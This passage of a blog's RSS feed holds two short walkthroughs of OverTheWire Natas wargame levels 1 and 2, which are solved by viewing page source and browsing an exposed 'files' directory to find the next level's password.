      <pubDate>Thu, 01 Nov 2012 06:36:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-01-overthewire-natas-level-2/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas2.shtml&#34;&gt;Level 2&lt;/a&gt; of &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&amp;rsquo;s&lt;/a&gt; Natas wargame is a little more fun than the previous two. It&amp;rsquo;s also pretty simple, though.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;You start out on a page that tells you that there is nothing on it.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas2_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Like previous levels, I then viewed the source to see what was in the code.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas2_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It appears that there&amp;rsquo;s a 1x1 pixel image present on the page. It&amp;rsquo;s located in a &amp;ldquo;files&amp;rdquo; directory of the webserver. I decided to see if there was anything else in that folder, and found a &amp;ldquo;users.txt&amp;rdquo; file.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas2_3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Once I viewed the &amp;ldquo;users.txt&amp;rdquo; file, it displayed the next level&amp;rsquo;s password.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas2_4.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 1</title>
      <link>https://www.mattandreko.com/blog/2012-10-31-overthewire-natas-level-1/</link>
      <pubDate>Wed, 31 Oct 2012 06:17:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-10-31-overthewire-natas-level-1/</guid>
      <description>&lt;p&gt;In continuing with the Natas wargame from &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt;, I tried my hand at &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas1.shtml&#34;&gt;level 1&lt;/a&gt;. It too was pretty easy. It was just like the level 0, except that right-clicking was disabled via javascript.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;You start out by being told that the password can be found on the page that you&amp;rsquo;re on, just like the last one.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas1_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;If you do try to right-click to view the source, you get a shiny error message stating that it has been blocked.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas1_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;To get around that, there are a multitude of ways. You could use wget/curl to view the page. You could disable javascript in your browser. You could use the developer tools in your browser to navigate the DOM. You could even save the file to your hard drive, and open it in a text editor. Or, you could simply prepend the url in the address bar with &amp;ldquo;view-source:&amp;rdquo; like I did.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas1_3.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
  </channel>
</rss>